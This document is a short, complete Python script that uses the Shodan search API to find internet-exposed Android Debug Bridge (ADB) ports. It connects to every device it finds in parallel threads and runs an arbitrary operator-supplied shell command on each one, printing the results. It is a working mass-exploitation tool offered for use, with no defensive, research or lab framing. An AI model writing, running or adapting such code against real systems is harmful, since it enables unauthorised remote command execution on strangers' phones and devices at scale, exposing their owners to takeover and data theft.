Requirements = pip install adb-shell shodan colorama
 
 
import threading
from time import sleep
from shodan import Shodan
from colorama import Fore
from adb_shell.adb_device import AdbDeviceTcp
from adb_shell.auth.sign_pythonrsa import PythonRSASigner
 
## Replace with your actual Shodan API key
api = Shodan('YOUR_SHODAN_API_KEY')
payload = input('Enter the command payload to execute: ')
 
def adb_connection(host, port, payload):
    try:
        print(f'{Fore.GREEN}[ CONNECTING ]{Fore.MAGENTA} {host}{Fore.GREEN}:{Fore.MAGENTA}{port}\n')
 
        ## Create an ADB TCP connection to the device
        device = AdbDeviceTcp(host=host, port=port, default_transport_timeout_s=9)
        device.connect(auth_timeout_s=0.5)
 
        ## Send the shell command to the connected device
        output = device.shell(command=str(payload))
 
        print(f'{Fore.CYAN}[ SUCCESS ] Output from {host}:{port}\n{output}\n')
 
        ## Disconnect after execution
        device.close()
    except Exception as e:
        print(f'{Fore.RED}[ ERROR ] Could not connect to {host}:{port}\n{Fore.YELLOW}Reason: {e}\n')
 
def search_and_execute(payload):
    try:
        ## Search for devices with open ADB ports (Android Debug Bridge)
        for result in api.search_cursor('"Android Debug Bridge"'):
            try:
                host = result['ip_str'].rstrip()
                port = result['port']
 
                ## Start a new thread for each device connection
                threading.Thread(target=adb_connection, args=(host, port, payload)).start()
 
                ## Add a small delay to prevent overwhelming threads
                sleep(0.5)
            except Exception as ex:
                print(f'{Fore.RED}[ ERROR ] Issue while processing {host}:{port} - {ex}\n')
    except Exception as e:
        print(f'{Fore.RED}[ ERROR ] Shodan API issue: {e}')
 
## Start the main function to search for devices and execute payload
search_and_execute(payload)
